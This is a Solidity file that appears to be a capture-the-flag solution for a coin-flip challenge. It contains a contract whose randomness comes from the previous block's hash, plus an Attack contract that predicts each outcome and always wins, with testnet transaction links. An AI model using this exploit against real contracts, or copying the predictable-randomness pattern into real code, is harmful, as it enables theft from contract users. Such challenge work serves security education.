// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
* Objective :
* - Flip 10 consecutive times and win the game.
*/

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        // @issue: blockhash is predictable
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        // e coinFlip is either 0 or 1
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

// https://sepolia.etherscan.io/tx/0x6ffead4af88e23ae1101b63ad528ef3059af2c067503920a88c2dbc0b313a1ae

contract Attack {
    CoinFlip public target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}

// https://sepolia.etherscan.io/tx/0x32784c97c74e4120ba21855ce1b94664922267d76a535e4b3970a93250bca663